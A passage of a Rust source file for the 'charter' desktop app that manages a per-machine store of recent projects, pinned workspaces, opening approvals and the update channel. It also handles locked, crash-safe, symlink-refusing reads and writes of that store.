    /// says why it is here and why the count had to be argued again.
    pub channel: crate::updates::Channel,
}

impl Store {
    /// What is remembered about `plane`, if anything.
    pub fn recent(&self, plane: &Path) -> Option<&Recent> {
        self.recents.iter().find(|entry| entry.plane == plane)
    }

    /// Put `plane` at the front of the list, keeping whatever was approved about it.
    ///
    /// **An open is not an approval**, so an existing [`Trust`] is carried over untouched and
    /// a plane that had none still has none. Opening a plane a hundred times must not turn
    /// into consent.
    pub fn remember(&mut self, plane: &Path, when: u64) {
        let entry = match self.recents.iter().position(|e| e.plane == plane) {
            Some(at) => {
                let mut entry = self.recents.remove(at);
                entry.opened = when;
                entry
            }
            None => Recent {
                plane: plane.to_path_buf(),
                opened: when,
                trust: None,
                pinned: false,
                pinned_workspaces: Vec::new(),
                most_active_pinned: false,
            },
        };
        self.recents.insert(0, entry);
        self.trim();
    }

    /// Drops the oldest **unpinned** entries past [`MOST_RECENTS`], keeping every pinned one
    /// up to [`MOST_PINNED`] ([`Room`]).
    ///
    /// **Not `truncate`, and ADR 0040 is why.** A pin is the only thing an operator
    /// can say to mean "not this one", so a pin that the sixty-fifth plane opened could
    /// silently undo would be a feature that stops working on the machine it is for.
    /// [`MOST_PINNED`] is what keeps the file bounded in its place; a pin beyond that is
    /// refused rather than granted, because the alternative is an unbounded file read at a
    /// cold launch.
    fn trim(&mut self) {
        let mut room = Room::default();
        self.recents.retain(|entry| room.fits(entry.pinned));
    }

    /// Whether another plane may be pinned on this machine.
    pub fn room_to_pin(&self) -> bool {
        self.recents.iter().filter(|entry| entry.pinned).count() < MOST_PINNED
    }

    /// Pins or unpins a project, answering whether anything changed.
    ///
    /// **A plane charter does not already remember cannot be pinned**, and that is the rule
    /// rather than an omission: this file's own test is that deleting it costs the operator
    /// their arrangement and nothing else, and an entry that exists only to hold a pin would
    /// be a plane path in the store that no open ever put there.
    pub fn pin(&mut self, plane: &Path, pinned: bool) -> Result<bool, String> {
        if pinned && !self.room_to_pin() && !self.recent(plane).is_some_and(|one| one.pinned) {
            return Err(format!(
                "charter pins at most {MOST_PINNED} projects on one machine. Unpin one first."
            ));
        }
        let Some(entry) = self.recents.iter_mut().find(|one| one.plane == plane) else {
            return Err(
                "charter does not remember that project, so there is nothing to pin.".to_owned(),
            );
        };
        let moved = entry.pinned != pinned;
        entry.pinned = pinned;
        // Unpinning puts the entry back under the recents bound, where it may now be past it.
        //
        // Only then, though `trim` would be harmless otherwise: every other change here keeps
        // the store inside both bounds (a pin moves an entry from the recents count to the
        // pinned one, and the check above keeps the pinned count within its bound), and a
        // store inside its bounds is one `trim` leaves as it is. So `||` for this `&&` is an
        // equivalent mutant, excluded in `.cargo/mutants.toml` on that ground.
        if moved && !pinned {
            self.trim();
        }
        Ok(moved)
    }

    /// Pins or unpins a workspace inside a plane, answering whether anything changed.
    ///
    /// The name is held to being a plain directory name here as well as on the way back in
    /// ([`usable_workspace`]): a pin written with a `/` in it would be a path, and a path in
    /// this field is the beginning of a second kind of thing living in it.
    pub fn pin_workspace(
        &mut self,
        plane: &Path,
        workspace: &str,
        pinned: bool,
    ) -> Result<bool, String> {
        usable_workspace(workspace)?;
        let Some(entry) = self.recents.iter_mut().find(|one| one.plane == plane) else {
            return Err(
                "charter does not remember that project, so there is nothing to pin in.".to_owned(),
            );
        };
        if pinned {
            if entry.pinned_workspaces.iter().any(|one| one == workspace) {
                return Ok(false);
            }
            if entry.pinned_workspaces.len() >= MOST_PINNED_WORKSPACES {
                return Err(format!(
                    "charter pins at most {MOST_PINNED_WORKSPACES} workspaces in one project. \
                     Unpin one first."
                ));
            }
            entry.pinned_workspaces.push(workspace.to_owned());
            return Ok(true);
        }
        let had = entry.pinned_workspaces.len();
        entry.pinned_workspaces.retain(|one| one != workspace);
        Ok(entry.pinned_workspaces.len() != had)
    }

    /// Puts a plane's pinned workspaces in the order `order` names them — the order the
    /// operator dragged them into on the workspace strip (ADR 0039, as amended by SI-6) —
    /// answering whether anything changed.
    ///
    /// **Arranging is not pinning.** A name in `order` that is not pinned is passed over:
    /// pinning has its own bound and its own refusal ([`Self::pin_workspace`]), and a
    /// drag that crosses from the unpinned tabs to the pinned ones pins first and arranges
    /// second.
    ///
    /// **Only what the window drew moves.** The pins `order` names take, in `order`'s
    /// sequence, the places those same pins held; a pin it does not name keeps its place. The
    /// window draws only the pins whose workspace still exists ([`Self::pinned_workspaces`]),
    /// so a dangling pin is one it never saw, and it is not the window's to move.
    pub fn arrange_workspaces(&mut self, plane: &Path, order: &[&str]) -> Result<bool, String> {
        let Some(entry) = self.recents.iter_mut().find(|one| one.plane == plane) else {
            return Err(
                "charter does not remember that project, so there is nothing to arrange in."
                    .to_owned(),
            );
        };
        let mut named = order
            .iter()
            .filter(|name| entry.pinned_workspaces.iter().any(|one| one == *name));
        let arranged: Vec<String> = entry
            .pinned_workspaces
            .iter()
            .map(|one| {
                if order.contains(&one.as_str()) {
                    named
                        .next()
                        .map_or_else(|| one.clone(), |name| (*name).to_owned())
                } else {
                    one.clone()
                }
            })
            .collect();
        let changed = arranged != entry.pinned_workspaces;
        entry.pinned_workspaces = arranged;
        Ok(changed)
    }

    /// Moves a workspace's pin to the name it was renamed to (charter#367), keeping its
    /// place in the order, and answers whether anything changed.
    ///
    /// A pin under the old name would otherwise dangle, which [`Self::pinned_workspaces`] then
    /// names as gone, and the renamed workspace would drop off the strip. Nothing is pinned
    /// that was not: a workspace nobody pinned is renamed unpinned.
    pub fn rename_workspace(&mut self, plane: &Path, old: &str, new: &str) -> bool {
        if usable_workspace(new).is_err() {
            return false;
        }
        let Some(entry) = self.recents.iter_mut().find(|one| one.plane == plane) else {
            return false;
        };
        let already = entry.pinned_workspaces.iter().any(|one| one == new);
        let mut changed = false;
        entry.pinned_workspaces.retain_mut(|one| {
            if one != old {
                return true;
            }
            changed = true;
            if already {
                return false;
            }
            new.clone_into(one);
            true
        });
        changed
    }

    /// The workspaces pinned in `plane` that **still exist**, and the pins that no longer name
    /// one.
    ///
    /// **A dangling pin is named, never drawn.** A workspace renamed or removed on disk leaves
    /// a pin with nothing under it, and a window that drew it would be offering a workspace
    /// the plane does not have — the same hazard ADR 0034 already names for a trust entry
    /// keyed on a path, one level down. `there` is the plane's own list and says which pins
    /// still resolve; the answer is in the order they were pinned in, which is the order the
    /// workspace strip draws them in (ADR 0054, charter#402).
    pub fn pinned_workspaces<'a>(
        &self,
        plane: &Path,
        there: &[&'a str],
    ) -> (Vec<&'a str>, Vec<String>) {
        let Some(entry) = self.recent(plane) else {
            return (Vec::new(), Vec::new());
        };
        let kept = entry
            .pinned_workspaces
            .iter()
            .filter_map(|name| there.iter().copied().find(|one| one == name))
            .collect();
        let gone = entry
            .pinned_workspaces
            .iter()
            .filter(|name| !there.contains(&name.as_str()))
            .cloned()
            .collect();
        (kept, gone)
    }

    /// Pins the [`FIRST_OPEN_PINS`] most recently active workspaces in `plane`, **once**
    /// (ADR 0054), answering whether it ran.
    ///
    /// The workspace strip draws the pinned workspaces and the one you are in, so a plane
    /// opened before that rule, or opened here for the first time, would draw almost nothing.
    /// This is its one-time arrangement: the workspaces most recently worked in, ranked by
    /// `briefing`'s `last_active` so "most recently active" means what the session-start
    /// briefing means by it. **Only in a plane the operator has pinned nothing in**: one they
    /// have arranged already is theirs, and it is marked done without a pin added.
    ///
    /// **Once, and recorded** ([`Recent::most_active_pinned`]). An operator who then unpins
    /// everything is not pinned again: a strip that pins and unpins on its own is the moving
    /// target ADR 0039 refused. A plane charter does not remember has nowhere to record it
    /// and is not touched; one whose workspaces cannot be listed is left to try again at the
    /// next open, because recording a run that pinned nothing it could see would be a lie
    /// the operator pays for with an empty strip.
    pub fn pin_the_most_active(&mut self, plane: &Path) -> bool {
        let Some(entry) = self.recents.iter_mut().find(|one| one.plane == plane) else {
            return false;
        };
        if entry.most_active_pinned {
            return false;
        }
        // The operator has arranged this plane already, and adding to it would be the strip
        // arranging itself. Spent, so unpinning everything later does not set it off either.
        if !entry.pinned_workspaces.is_empty() {
            entry.most_active_pinned = true;
            return false;
        }
        let Ok(names) = crate::workspaces::Plane::open(plane).workspaces() else {
            return false;
        };
        let mut ranked: Vec<(f64, String)> = names
            .into_iter()
            .map(|name| {
                let when = crate::briefing::last_active(plane, &name).unwrap_or(0.0);
                (when, name)
            })
            .collect();
        ranked.sort_by(|one, other| other.0.total_cmp(&one.0));
        for (_, name) in ranked.into_iter().take(FIRST_OPEN_PINS) {
            if entry.pinned_workspaces.len() >= MOST_PINNED_WORKSPACES {
                break;
            }
            entry.pinned_workspaces.push(name);
        }
        entry.most_active_pinned = true;
        true
    }

    /// Record that the operator approved `plane` while it contributed `contributed`.
    pub fn approve(&mut self, plane: &Path, when: u64, contributed: Contribution) {
        self.remember(plane, when);
        if let Some(entry) = self.recents.first_mut() {
            entry.trust = Some(Trust {
                approved: when,
                contributed,
            });
        }
    }

    /// Re-fingerprint an **already approved** plane, because charter itself just changed what
    /// opening it would do.
    ///
    /// **The wiring contract, and the whole design rests on it:** whoever writes a plane's
    /// `.charter/app/reopen.json` calls this immediately afterwards. charter rewrites that
    /// record every time a chat opens or closes (`Chats::write_it_down`), so without this the
    /// stored fingerprint would go stale on the operator's own first action and
    /// [`Consent::must_ask`] would fire on a chat they started themselves. With it, the
    /// fingerprint tracks charter's own writes and can only ever disagree when **something
    /// that is not this charter** wrote the record — which is exactly the case the question
    /// exists for.
    ///
    /// **It never creates an approval**, only refreshes one. A plane nobody has approved stays
    /// [`Consent::New`] however many times charter writes its record, so a wiring mistake
    /// cannot turn charter's own bookkeeping into consent.
    ///
    /// Order the two writes as record-then-vouch or vouch-then-record as suits the caller: a
    /// crash between them leaves a fingerprint that does not match the record on disk, which
    /// is one spurious question at the next launch. That is the direction that is safe, and it
    /// is the only one.
    pub fn vouch(&mut self, plane: &Path, contributed: Contribution, when: u64) {
        if let Some(entry) = self.recents.iter_mut().find(|e| e.plane == plane)
            && let Some(trust) = entry.trust.as_mut()
        {
            trust.approved = when;
            trust.contributed = contributed;
        }
    }

    /// Drop `plane` from the list, and with it any approval.
    pub fn forget(&mut self, plane: &Path) {
        self.recents.retain(|entry| entry.plane != plane);
        for window in &mut self.windows {
            window.planes.retain(|open| open != plane);
        }
        self.windows.retain(|window| !window.planes.is_empty());
        for window in &mut self.windows {
            window.active = window.active.min(window.planes.len() - 1);
        }
    }

    /// Whether `plane` may be opened without asking, given what it contributes now.
    pub fn consent(&self, plane: &Path, contributes: &Contribution) -> Consent {
        let Some(trust) = self.recent(plane).and_then(|entry| entry.trust.as_ref()) else {
            return Consent::New;
        };
        let changes = trust.contributed.against(contributes);
        if changes.is_empty() {
            Consent::Unchanged
        } else if changes.iter().any(Change::is_a_grant) {
            Consent::Grew(changes)
        } else {
            Consent::Noted(changes)
        }
    }
}

/// Something the store held that charter would not take back.
///
/// Every one of these is a **drop with a reason**, never an error a launch has to handle: an
/// opener that shows one fewer row and can say why is usable, and a dialog before there is a
/// window is not.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Dropped {
    /// The file parsed as something, and that something is not this store.
    TheStore(String),
    /// One remembered plane.
    Recent { plane: String, why: String },
    /// One window, or one tab in one.
    Window { plane: String, why: String },
    /// One pinned workspace, inside a plane that was itself taken.
    Pin { workspace: String, why: String },
    /// The update channel, because the word is not one charter writes. The machine stays on
    /// the default, which is stable.
    Channel { named: String },
}

impl std::fmt::Display for Dropped {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::TheStore(why) => write!(f, "charter's machine store {why}"),
            Self::Recent { plane, why } => write!(f, "the remembered plane '{plane}' {why}"),
            Self::Window { plane, why } => write!(f, "the open plane '{plane}' {why}"),
            Self::Pin { workspace, why } => write!(f, "the pinned workspace '{workspace}' {why}"),
            Self::Channel { named } => write!(
                f,
                "'{named}' is not an update channel charter knows, so this machine stays on \
                 {}",
                crate::updates::Channel::default().name()
            ),
        }
    }
}

/// What a read of the store came back with.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct Loaded {
    pub store: Store,
    /// What was in the file and is not in the store, each with its reason.
    pub dropped: Vec<Dropped>,
    /// Why the file could not be read **at all** — a link, a FIFO, a giant, no permission, or
    /// a platform charter keeps no store on.
    ///
    /// This is not the same as a file that parsed badly, and [`update`] treats the two
    /// differently: content charter could read and did not understand is replaced, and a file
    /// charter could not read is left exactly where it is.
    pub unreadable: Option<String>,
}

/// Everything charter kept outside a plane, with whatever it would not take back named.
///
/// **This never fails**, because every caller is a launch. A missing file is a first launch;
/// anything else is an empty store plus a reason.
///
/// The read is gated the way every read of charter's own state is (ADR 0028):
///
/// - [`crate::contain::open_no_link`] against `config_root`, so a link at `charter/` or at the
///   file itself cannot make this answer out of somebody else's file — and so the last
///   component's answer is the **kernel's, at the instant of the open**, rather than
///   charter's a moment earlier;
/// - the plain-file and size questions asked of the **open descriptor**, which no swap can
///   get between, exactly as [`crate::reopen::read_or_refusal`] asks them;
/// - `O_NONBLOCK`, which comes with the same open, because a FIFO is not a link and reading
///   one blocks for ever — here, at a cold launch, before there is a window or a tray.
pub fn read(config_root: &Path) -> Loaded {
    let text = match read_text(config_root) {
        Ok(None) => return Loaded::default(),
        Ok(Some(text)) => text,
        Err(why) => {
            return Loaded {
                unreadable: Some(why.to_string()),
                ..Loaded::default()
            };
        }
    };
    let mut dropped = Vec::new();
    let store = match parse(&text) {
        Ok(doc) => load(&doc, &mut dropped),
        Err(why) => {
            dropped.push(Dropped::TheStore(why));
            Store::default()
        }
    };
    Loaded {
        store,
        dropped,
        unreadable: None,
    }
}

/// The text as a store document of **this** version, or why it is not one.
///
/// Read as a `serde_json::Value` and asked about by hand, the way
/// [`crate::profiletrust`] reads its record, rather than deserialised into a shape: every
/// level of this file can be anything, one bad entry must cost one row and not the list,
/// and this crate turns `arbitrary_precision` on — which changes what a `Value` is and is a
/// reason not to route a typed read back through one.
fn parse(text: &str) -> Result<serde_json::Value, String> {
    let doc: serde_json::Value =
        serde_json::from_str(text).map_err(|why| format!("is not a store charter wrote: {why}"))?;
    if !doc.is_object() {
        return Err("is not a store charter wrote: it is not an object".to_owned());
    }
    match doc.get("version").and_then(serde_json::Value::as_u64) {
        Some(found) if found == u64::from(VERSION) => Ok(doc),
        Some(found) => Err(format!(
            "is version {found}, and this charter writes version {VERSION}"
        )),
        None => Err("says no version, so charter cannot say what it means".to_owned()),
    }
}

/// The file's bytes, `None` for no file at all, an error for a file charter will not read.
fn read_text(config_root: &Path) -> io::Result<Option<String>> {
    read_beside(config_root, FILE, MAX_BYTES, "charter's machine store")
}

/// The bytes of `name` in charter's own directory, gated exactly as the store's own read is.
///
/// **One implementation for every file in that directory** (`crate::beside` reads the
/// window's layout and the operator's theme through it). The module docstring's reason for
/// keeping a fifth thing in this file rather than beside it was that a second file would have
/// to get containment right a second time; this is how a file that has to be beside it — one
/// an operator edits by hand — gets it right the first time instead.
///
/// `what` names the file in a refusal, as the operator would: "charter's machine store".
pub(crate) fn read_beside(
    config_root: &Path,
    name: &str,
    max_bytes: u64,
    what: &str,
) -> io::Result<Option<String>> {
    supported()?;
    let target = dir(config_root).join(name);
    let mut open = match crate::contain::open_no_link(config_root, &target) {
        Ok(open) => open,
        Err(gone) if gone.kind() == io::ErrorKind::NotFound => return Ok(None),
        Err(refused) => return Err(refused),
    };
    // `fstat` of the descriptor the read will use, never of the name: the two cannot be
    // handed two different files.
    let found = open.metadata()?;
    if !found.file_type().is_file() {
        return Err(io::Error::new(
            io::ErrorKind::InvalidData,
            format!(
                "{} is not a plain file, and {what} is read from nothing else",
                target.display()
            ),
        ));
    }
    if found.len() > max_bytes {
        return Err(io::Error::new(
            io::ErrorKind::InvalidData,
            format!(
                "{} is {} bytes, and {what} is never larger than {max_bytes}",
                target.display(),
                found.len()
            ),
        ));
    }
    let mut text = String::new();
    io::Read::read_to_string(&mut open, &mut text)?;
    Ok(Some(text))
}

/// Read the store, change it, and write it back.
///
/// **A store charter could not read is never overwritten.** The difference between "this file
/// says nothing charter understands" and "charter could not read this file" is the difference
/// between content worth replacing and a path that is compromised or a disk that is failing —
/// and clobbering the second destroys the operator's list and their approvals to fix nothing.
/// So the first is replaced and the second refuses, loudly, with the reason attached.
pub fn update(config_root: &Path, change: impl FnOnce(&mut Store)) -> io::Result<Loaded> {
    // **Held across the read AND the write, which is the whole of it** (charter-app#123). This
    // is a read-modify-write of one small file, and every writer of it rewrites the WHOLE
    // store — so two of them interleaving does not merge, it drops one. What is dropped is an
    // approval, a pin, or the list of projects a window had open.
    //
    // It was always possible and it is now ordinary. Tauri runs commands on a thread pool, so
    // two opens racing is two threads; `Records::vouch` fires on every chat that opens or
    // closes; and `remember_arrangement` fires on every tab change, which #125's author
    // measured as *far* more often than an approval. A second charter process makes it
    // cross-process, which is why this is `flock` and not a `Mutex`.
    let _held = Lock::on(config_root);
    let mut loaded = read(config_root);
    if let Some(why) = &loaded.unreadable {
        return Err(io::Error::new(
            io::ErrorKind::PermissionDenied,
            format!("charter will not overwrite a machine store it could not read: {why}"),
        ));
    }
    change(&mut loaded.store);
    write(config_root, &loaded.store)?;
    Ok(loaded)
}

/// The lock file's name, beside the store in charter's own `0700` directory.
///
/// A separate file and not the store itself: [`write`] replaces the store by `rename`, so a
/// lock held on the store's inode would be a lock on an inode that is no longer the store the
/// moment the first writer finished, and the second writer would take a lock on nothing.
const LOCK: &str = "machine.json.lock";

/// Held for the length of one [`update`], so a read-modify-write of the store is one act.
///
/// **Advisory, and every taker of it is in this module** — `update` is the only
/// read-modify-write, `write` on its own replaces the whole document, and nothing outside this
/// crate can reach either without going through them. A lock cannot guard a call that does not
/// take it, and here the calls that must take it are three lines apart.
///
/// **Best effort, with the consequence named.** A lock charter could not create or could not
/// take does not stop the update: the alternative is an app that cannot record an approval
/// because a `0700` directory is on a filesystem with no `flock` (many network mounts answer
/// `ENOTSUP`), which trades a rare lost write for a permanent one. What is lost when the lock
/// is missing is exactly what was lost before it existed, so this can only ever add safety.
///
/// It is taken **blocking**. `flock` is released by the kernel when the descriptor closes,
/// including on a process that was killed, so there is no holder that outlives a couple of
/// syscalls and nothing here can wedge on a stale lock.
struct Lock(Option<std::fs::File>);

impl Lock {
    fn on(config_root: &Path) -> Self {
        // A platform charter keeps no store on gets no directory made for one either.
        if supported().is_err() {
            return Self(None);
        }
        let Ok(dir) = private_dir(config_root) else {
            return Self(None);
        };
        // `create` and not `create_new`: the lock file is the *name* two processes agree on,
        // it holds nothing, and one left behind by a previous run is the ordinary case.
        let Ok(file) = std::fs::File::create(dir.join(LOCK)) else {
            return Self(None);
        };
        #[cfg(unix)]
        match rustix::fs::flock(&file, rustix::fs::FlockOperation::LockExclusive) {
            Ok(()) => Self(Some(file)),
            Err(_) => Self(None),
        }
        // Nothing to lock off unix, and nothing to lose: [`supported`] refuses the store
        // outright there (ADR 0031, charter-app#98), so `update` never reaches a write.
        #[cfg(not(unix))]
        {
            drop(file);
            Self(None)
        }
    }
}

impl Drop for Lock {
    fn drop(&mut self) {
        if let Some(file) = self.0.take() {
            #[cfg(unix)]
            let _ = rustix::fs::flock(&file, rustix::fs::FlockOperation::Unlock);
            drop(file);
        }
    }
}

/// Write the store, creating charter's directory at `0700` if it is not there.
///
/// **Crash-safe by replacement, and the object being replaced is an inode** (the lesson
/// charter-app#82 left about `ETXTBSY`: reason about the inode, never about the path). The
/// bytes go to a file beside the store, are flushed to the disk, and are then `rename`d over
/// the name. A launch reading at that moment holds a descriptor on the old inode and reads
/// the whole of the old store; a launch opening afterwards opens the new one. Neither can see
/// half of one, and a process killed between the two leaves the previous store intact with a
/// stray temp file beside it.
///
/// That is [`crate::rewrite::replace`] with [`crate::rewrite::Mode::Private`] (#434), gated
/// from the config home: the walk covers the store's path **and** the temp file the bytes
/// actually land on — the mistake this repo has had six review rounds on, and the one that
/// put a whole `reopen.json` outside a plane through a committed
/// `reopen.json.writing -> elsewhere`. A store that is itself a link is refused.
pub fn write(config_root: &Path, store: &Store) -> io::Result<()> {
    supported()?;
    let dir = private_dir(config_root)?;
    let text = serde_json::to_string_pretty(&OnDisk::from(store))
        .expect("the store is plain data serde can always write");
    write_beside(config_root, &dir.join(FILE), (text + "\n").as_bytes())
}

/// Replace `target`, a file in charter's own directory, whole: 0600, through the walk from
/// `config_root`, never through a link (#434). Every writer of that directory — the store,
/// the extension record, the window's layout — goes through here.
pub(crate) fn write_beside(config_root: &Path, target: &Path, bytes: &[u8]) -> io::Result<()> {
    crate::rewrite::replace(config_root, target, bytes, crate::rewrite::Mode::Private)
}

/// charter's directory under `config_root`, private to the operator.
///
/// **Tightened even when it is already there**, which is where this differs from
/// [`crate::profiletrust::private_dir`]'s rule of leaving an existing directory exactly as it
/// was found. That rule exists because `$CHARTER_HOME` can point a plane's state directory at
/// a home or a team share the operator chose, and charter has no business re-moding it. No
/// such escape hatch reaches here: this directory is charter's own, at a path charter alone
/// decides, holding a list of every project the operator opens and their approvals of each.
///
/// The tightening is best-effort, as every `chmod` in this crate is: a filesystem with fixed
/// permissions (exFAT, many network mounts) cannot hold a mode, and refusing to keep state to
/// protect a mode the filesystem was never going to keep helps nobody. The mode that the
/// guard rests on is the one set at **creation**, which is not best-effort.
pub(crate) fn private_dir(config_root: &Path) -> io::Result<PathBuf> {
    // The config home itself is made without a mode: `~/.config` belongs to the operator
    // and to every application on the machine, and charter creating it at 0700 would quietly
    // re-mode a directory that is not its own. `0700` starts at charter's own level.
    std::fs::create_dir_all(config_root)?;
    let dir = dir(config_root);
    // Refuses a symlink at the directory and creates it at 0700, which is exactly what is
    // wanted here — one implementation, because two drift.
    crate::profiletrust::private_dir(&dir)?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let _ = std::fs::set_permissions(&dir, std::fs::Permissions::from_mode(0o700));
    }
    Ok(dir)
}

/// Whether a remembered path still names a plane, or why it should be dropped.
///
/// **Deliberately not asked by [`read`], and that is a decision rather than an omission.**
/// Every question here is a `stat`, and a remembered plane can be on a network mount, an
/// unplugged external disk or an automounted share. A cold launch that stats sixty-four of
/// them before it can draw the opener is a launch that hangs on the one that is gone, with
/// nothing on screen to say so. So the read is lexical and total, and the disk is asked per
/// row, by whoever is about to show or open one.
///
/// A path that is a **symlink now** is dropped rather than followed. It may be honest — a
/// project moved to another volume and linked back — but the approval recorded against it was
/// recorded for what the path pointed at then, and charter cannot tell the two apart. The
/// repair is in the operator's hands and costs one dialog: open it again by its real path,
/// which asks about it again. (A link *above* the plane — a symlinked `$HOME`, `/tmp` on
/// macOS — is ordinary and is not asked about, exactly as `contain` does not ask about the
/// components above the root it is given.)
pub fn still_a_plane(plane: &Path) -> Result<(), String> {
    let found = std::fs::symlink_metadata(plane).map_err(|_| "is no longer there".to_owned())?;
    if found.file_type().is_symlink() {
        return Err(
            "is a symlink now, and charter opens a plane by the path that was approved".to_owned(),
        );
    }
    if !found.is_dir() {
        return Err("is not a directory any more".to_owned());
    }
    if !plane.join(crate::plane::MANIFEST).is_file() {
        return Err(format!(
            "is not a plane any more: it holds no {}",
            crate::plane::MANIFEST
        ));
    }
    Ok(())
}

/// Whether a path off the file may be used, and why not.
///
/// Lexical only, and total: these are the questions that can be asked of a **string** off a
/// file charter did not write this run.
fn usable(raw: &str) -> Result<PathBuf, String> {
    if raw.is_empty() {
        return Err("is empty".to_owned());
    }
    // A NUL terminates the string inside the C library, so the path charter checked and the
    // path the kernel opened would be two different strings.
    if raw.contains('\0') {
        return Err("holds a NUL, so the kernel would see a shorter path".to_owned());
    }
    let path = PathBuf::from(raw);
    if !path.is_absolute() {
        return Err(
            "is not absolute, and a relative path resolves against a working directory that is \
             '/' for an app nobody launched from a terminal"
                .to_owned(),
        );
    }
    if path.components().any(|part| part == Component::ParentDir) {
        return Err("walks up through '..', and charter's own paths never do".to_owned());
    }
    Ok(path)
}

/// A pinned workspace's name held to being a plain directory name, or why it is not one.
///
/// **A name and never a path.** A workspace is a directory beside `charter.toml` and nothing
/// in this file ever joins this string onto anything — but a separator, a `..` or a NUL in it
/// is the shape of a value that a later reader would join, and the cheapest place to refuse
/// that is where it comes off the disk. The same check runs on the way in
/// ([`Store::pin_workspace`]) so that a name charter would not read back is never written.
fn usable_workspace(name: &str) -> Result<(), String> {
    if name.is_empty() {
        return Err("is empty, and a workspace has a name".to_owned());
    }
    if name.len() > LONGEST_WORKSPACE_NAME {
        return Err(format!(
            "is {} bytes, and a workspace's name is never longer than {LONGEST_WORKSPACE_NAME}",
            name.len()
        ));
    }
    if name.contains('\0') {
        return Err("holds a NUL, which no name on a file system does".to_owned());
    }
    if name.contains('/') || name.contains('\\') {
        return Err("is a path and not a name, and charter pins a workspace by name".to_owned());
    }
    if name == "." || name == ".." {
        return Err("names a directory rather than a workspace in one".to_owned());
    }
    Ok(())
}

/// The file's contents held to what a store may be, with every refusal recorded.
///
/// Every value is asked about rather than assumed: a `recents` that is a number, an entry
/// that is a string, a `trust` that is a list. Each costs the one row it is, because a store
/// is read at a cold launch and one bad row must not be a lost list.
fn load(doc: &serde_json::Value, dropped: &mut Vec<Dropped>) -> Store {
    let mut recents: Vec<Recent> = Vec::new();
    // The two bounds, counted apart. One definition, in `Room`.
    let mut room = Room::default();
    for raw in array(doc.get("recents")) {
        let named = raw
            .get("plane")
            .and_then(serde_json::Value::as_str)
            .unwrap_or_default()
            .to_owned();
        let why = if named.is_empty() && !raw.is_object() {
            Err("is not an entry charter wrote".to_owned())
        } else {
            usable(&named)
        };
        let plane = match why {
            Ok(plane) => plane,
            Err(why) => {
                dropped.push(Dropped::Recent { plane: named, why });
                continue;
            }
        };
        if recents.iter().any(|kept| kept.plane == plane) {
            dropped.push(Dropped::Recent {
                plane: named,
                why: "is in the list twice, and the later entry is the stale one".to_owned(),
            });
            continue;
        }
        // A `pinned` that is not a boolean is not a pin. That direction is the safe one: the
        // entry then spends the recents bound like any other and can fall off the end, which
        // costs an arrangement rather than letting a malformed file grow the file's bound.
        let pinned = raw
            .get("pinned")
            .and_then(serde_json::Value::as_bool)
            .unwrap_or(false);
        if !room.fits(pinned) {
            dropped.push(Dropped::Recent {
                plane: named,
                why: Room::why(pinned),
            });
            continue;
        }
        recents.push(Recent {
            plane,
            opened: number(raw.get("opened")),
            // A `trust` that is not one is NO trust, so the plane is asked about again.
            // There is no shape of malformed approval that it is safe to read as a yes.
            trust: raw.get("trust").and_then(trust_of),
            pinned,
            pinned_workspaces: pinned_workspaces_of(raw.get("pinnedWorkspaces"), dropped),
            // Anything but `true` is "not yet", which costs one pinning at the next open. The
            // other direction would leave a strip with nothing on it but where you are.
            most_active_pinned: raw
                .get("mostActivePinned")
                .and_then(serde_json::Value::as_bool)
                .unwrap_or(false),
        });
    }

    let mut windows = Vec::new();
    for raw in array(doc.get("windows")) {
        let mut planes = Vec::new();
        for named in array(raw.get("planes")) {
            let named = named.as_str().unwrap_or_default().to_owned();
            match usable(&named) {
                Ok(plane) => planes.push(plane),
                Err(why) => dropped.push(Dropped::Window { plane: named, why }),
            }
        }
        if planes.is_empty() {
            continue;
        }
        windows.push(Window {
            // Clamped rather than dropped: an index past the end is what a dropped tab
            // leaves behind, and a window that opens on the wrong tab is a smaller wrong
            // than a window that does not open.
            active: (number(raw.get("active")) as usize).min(planes.len() - 1),
            planes,
        });
    }

    Store {
        recents,
        windows,
        channel: channel_of(doc.get("channel"), dropped),
    }
}

/// The pinned workspace names off one entry, with every refusal recorded.
///
/// A name charter would not write is dropped rather than raised, exactly as a remembered plane
/// is: a pin is an arrangement, and losing one costs the operator a click.
///
/// **In the file's order, which is the order they were pinned in** (charter#402). A file an
/// older charter wrote held the names as a set, written sorted — the plane's own order, since
/// the plane lists its workspaces sorted by name — so it reads back as the arrangement its
/// operator already had, with nothing to migrate. A name written twice is kept once, where it
/// was first.
fn pinned_workspaces_of(
    raw: Option<&serde_json::Value>,
    dropped: &mut Vec<Dropped>,
) -> Vec<String> {
    let mut kept: Vec<String> = Vec::new();
    for value in array(raw) {
        let Some(name) = value.as_str() else {
            dropped.push(Dropped::Pin {
                workspace: String::new(),
                why: "is not a name charter wrote".to_owned(),
            });
            continue;
        };
        if let Err(why) = usable_workspace(name) {
            dropped.push(Dropped::Pin {
                workspace: name.to_owned(),
                why,
            });
            continue;
        }
        // Asked before the bound, so a repeat of a name already kept is merged rather than
        // reported as past it.
        if kept.iter().any(|one| one == name) {
            continue;
        }
        if kept.len() >= MOST_PINNED_WORKSPACES {
            dropped.push(Dropped::Pin {
                workspace: name.to_owned(),
                why: format!(
                    "is past the {MOST_PINNED_WORKSPACES} workspaces charter pins in one project"
                ),
            });
            continue;
        }
        kept.push(name.to_owned());
    }
    kept
}

/// Which stream the file says this machine is on, defaulting to stable and saying when it did.
///
/// **Every way of not knowing lands on stable**, because the two directions are not
/// symmetric. Reading a corrupt file as *stable* costs an operator who had chosen dev one
/// trip back to the setting; reading it as *dev* puts a machine on a stream cut from any
/// green `main` without anybody asking for it. A file charter did not write must never be
/// able to do the second, and the safe answer is also the default answer, so nothing has to
/// remember which it was.
///
/// The word is [`crate::updates::Channel::named`]'s, which is exact: no trimming, no case
/// folding. What is dropped is recorded, so a store hand-edited to `"Dev"` says why it did
/// not take rather than silently doing nothing.
fn channel_of(
    raw: Option<&serde_json::Value>,
    dropped: &mut Vec<Dropped>,
) -> crate::updates::Channel {
    let Some(value) = raw else {
        // No field at all is the ordinary case: the store charter wrote before channels
        // existed, and the store it writes for every machine on the default.
        return crate::updates::Channel::default();
    };
    let named = value.as_str().unwrap_or_default();
    match crate::updates::Channel::named(named) {
        Some(channel) => channel,
        None => {
            dropped.push(Dropped::Channel {
                named: named.to_owned(),
            });
            crate::updates::Channel::default()
        }
    }
}

